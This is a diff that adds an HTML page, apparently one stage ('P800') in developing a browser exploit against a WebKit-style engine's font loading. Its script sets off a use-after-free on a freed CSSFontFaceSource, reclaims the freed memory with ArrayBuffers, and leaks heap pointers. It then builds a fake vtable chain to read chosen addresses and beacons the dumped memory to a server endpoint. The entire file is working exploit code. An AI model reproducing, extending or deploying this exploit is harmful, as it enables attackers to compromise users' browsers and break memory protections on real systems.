@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P800 — Clean Oracle Scan</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P800 — Clean Oracle Scan (one read per page load)
+ *
+ * P799 showed multi-read works but degrades across WebProcess
+ * lifetimes. Fix: ONE oracle read per fresh page load.
+ *
+ * Each phase:
+ *   Pass 1: standard UAF → get self, q11, q13
+ *   Pass 2: warmup UAF (expected MISS, primes allocator)
+ *   Pass 3: THE oracle read + FULL DUMP of pass 3 AB
+ *   → report, advance phase, reload
+ *
+ * PHASES:
+ *   A: self+0x00 (q0=1, calibration — MUST survive)
+ *   B: self+0x08 (q1=q11, calibration — MUST survive)
+ *   C: q13+0x00 (freed CSSFontFaceSource vtable ptr)
+ *   D: q13+0x08
+ *   E: q13+0x10
+ *   F: q13+0x18
+ *   G: q13+0x20
+ *   H: q13+0x28
+ *   I: q13+0x30
+ *   J: q13+0x38
+ *
+ * CRASH_CLASS: HIGH — controlled pointer chain
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P800-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P800-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+var PHASES = ['A','B','C','D','E','F','G','H','I','J'];
+
+function getPhase(){
+  try { return localStorage.getItem('p800_phase') || 'A'; }
+  catch(e){ return 'A'; }
+}
+function setPhase(p){
+  try { localStorage.setItem('p800_phase', p); } catch(e){}
+}
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = '';
+
+  var phase = getPhase();
+  var idx = PHASES.indexOf(phase);
+  if (idx < 0 || idx >= PHASES.length){
+    b('DONE', 'all_phases_complete');
+    log('All phases complete!');
+    try { localStorage.removeItem('p800_phase'); } catch(e){}
+    return;
+  }
+
+  var nextPhase = (idx + 1 < PHASES.length) ? PHASES[idx + 1] : 'DONE';
+  setPhase(nextPhase);
+
+  b('BOOT', 'phase=' + phase);
+  log('P800 — Clean Oracle — Phase ' + phase + '\n');
+
+  /* ===== PASS 1: get addresses ===== */
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:cs1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('cf1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var abs1 = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em cs1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em cf1, cs1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best1 = -1;
+    for (var i = 0; i < abs1.length; i++){
+      var v = new BigUint64Array(abs1[i]);
+      if (v[0] === 1n){ best1 = i; break; }
+    }
+    if (best1 < 0){
+      b(phase + '-P1-MISS', 'no_reclaim');
+      log('P1 MISS, retrying phase ' + phase + '...');
+      setPhase(phase);
+      setTimeout(function(){ location.reload(); }, 800);
+      return;
+    }
+
+    var view1 = new BigUint64Array(abs1[best1]);
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+    var self1 = q11_1 - 0x68n;
+
+    b(phase + '-P1', 'self=0x' + h16(self1) + '|q13=0x' + h16(q13_1));
+    log('P1: self=0x' + h16(self1) + ' q13=0x' + h16(q13_1));
+
+    /* Setup chain */
+    view1[13] = self1 + 0x10n;
+    view1[2]  = self1 + 0x20n;
+    view1[3]  = 0n;
+    for (var i = 4; i <= 10; i++) view1[i] = 0n;
+    view1[14] = 0x4242424242424242n;
+    view1[15] = 0n; view1[16] = 0n;
+
+    /* Compute target for this phase */
+    var target, tlabel;
+    if (phase === 'A')      { target = self1;            tlabel = 'self+0x00 (q0=1)'; }
+    else if (phase === 'B') { target = self1 + 0x08n;   tlabel = 'self+0x08 (q1)'; }
+    else {
+      var off = (idx - 2) * 8;
+      target = q13_1 + BigInt(off);
+      tlabel = 'q13+0x' + off.toString(16).toUpperCase();
+    }
+
+    view1[7] = target; /* vtable[3] = target */
+    b(phase + '-TARGET', 'addr=0x' + h16(target) + '|' + tlabel);
+    log('Target: ' + tlabel + ' [0x' + h16(target) + ']\n');
+
+    /* ===== PASS 2: warmup (expected MISS) ===== */
+    var st2 = document.createElement('style');
+    st2.textContent = '@font-face{font-family:cs2;src:local(Arial);unicode-range:U+0044;}';
+    document.head.appendChild(st2);
+
+    var face2 = new FontFace('cf2', 'local(Helvetica)', { unicodeRange: 'U+0045' });
+    document.fonts.add(face2);
+    void face2.loaded;
+
+    var abs2 = [], fired2 = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function(){
+        if (fired2) return undefined;
+        fired2 = true;
+        if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
+        try { document.fonts.delete(this); } catch(e){}
+        document.body.offsetHeight;
+        for (var k = 0; k < 64; k++){
+          var ab = new ArrayBuffer(192);
+          var v = new BigUint64Array(ab);
+          v[1] = q11_1;
+          abs2.push(ab);
+        }
+        try { document.fonts.check('1em cs2'); } catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },
+      set: function(){}
+    });
+
+    document.fonts.load('1em cf2, cs2', 'DE');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      var best2 = -1;
+      for (var i = 0; i < abs2.length; i++){
+        var v = new BigUint64Array(abs2[i]);
+        if (v[0] === 1n){ best2 = i; break; }
+      }
+
+      if (best2 >= 0){
+        /* Warmup actually HIT — this IS the oracle read! */
+        b(phase + '-P2-HIT', 'warmup_reclaimed');
+        doDump(phase, abs2, best2, 'p2');
+        return;
+      }
+
+      b(phase + '-P2-MISS', 'warmup_miss_expected');
+      log('P2 warmup MISS (expected)');
+
+      /* ===== PASS 3: THE oracle read ===== */
+      var st3 = document.createElement('style');
+      st3.textContent = '@font-face{font-family:cs3;src:local(Arial);unicode-range:U+0046;}';
+      document.head.appendChild(st3);
+
+      var face3 = new FontFace('cf3', 'local(Helvetica)', { unicodeRange: 'U+0047' });
+      document.fonts.add(face3);
+      void face3.loaded;
+
+      var abs3 = [], fired3 = false;
+      Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function(){
+          if (fired3) return undefined;
+          fired3 = true;
+          if (st3){ st3.remove(); st3.textContent = ''; st3 = null; }
+          try { document.fonts.delete(this); } catch(e){}
+          document.body.offsetHeight;
+          for (var k = 0; k < 64; k++){
+            var ab = new ArrayBuffer(192);
+            var v = new BigUint64Array(ab);
+            v[1] = q11_1;
+            abs3.push(ab);
+          }
+          try { document.fonts.check('1em cs3'); } catch(e){}
+          document.body.offsetHeight;
+          return undefined;
+        },
+        set: function(){}
+      });
+
+      document.fonts.load('1em cf3, cs3', 'FG');
+
+      setTimeout(function(){
+        delete FontFace.prototype.then;
+
+        var best3 = -1;
+        for (var i = 0; i < abs3.length; i++){
+          var v = new BigUint64Array(abs3[i]);
+          if (v[0] === 1n){ best3 = i; break; }
+        }
+
+        if (best3 < 0){
+          b(phase + '-P3-MISS', 'no_reclaim');
+          log('P3 MISS. Retrying phase...');
+          setPhase(phase);
+          setTimeout(function(){ location.reload(); }, 800);
+          return;
+        }
+
+        doDump(phase, abs3, best3, 'p3');
+      }, 600);
+    }, 600);
+  }, 500);
+}
+
+function doDump(phase, absArr, bestIdx, passLabel){
+  var view = new BigUint64Array(absArr[bestIdx]);
+
+  /* FULL DUMP: report ALL non-zero qwords */
+  var nz = [];
+  for (var q = 0; q < 24; q++){
+    if (view[q] !== 0n) nz.push('q' + q + '=0x' + h16(view[q]));
+  }
+
+  b(phase + '-NZ', passLabel + '|' + nz.join('|').slice(0, 600));
+  log('SURVIVED! (' + passLabel + ')');
+  log('Non-zero fields: ' + nz.length);
+  for (var i = 0; i < nz.length; i++) log('  ' + nz[i]);
+
+  /* Also beacon the raw first 12 qwords (96 bytes) as hex for comparison */
+  var raw = '';
+  for (var q = 0; q < 12; q++) raw += h16(view[q]);
+  b(phase + '-RAW', raw);
+
+  /* Second half */
+  var raw2 = '';
+  for (var q = 12; q < 24; q++) raw2 += h16(view[q]);
+  b(phase + '-RAW2', raw2);
+
+  log('\n*** Phase ' + phase + ' SURVIVED ***');
+
+  /* Advance and reload after delay */
+  setTimeout(function(){ location.reload(); }, 1000);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P800 — Clean Oracle Scan — Loading...</pre>
+</body>
+</html>
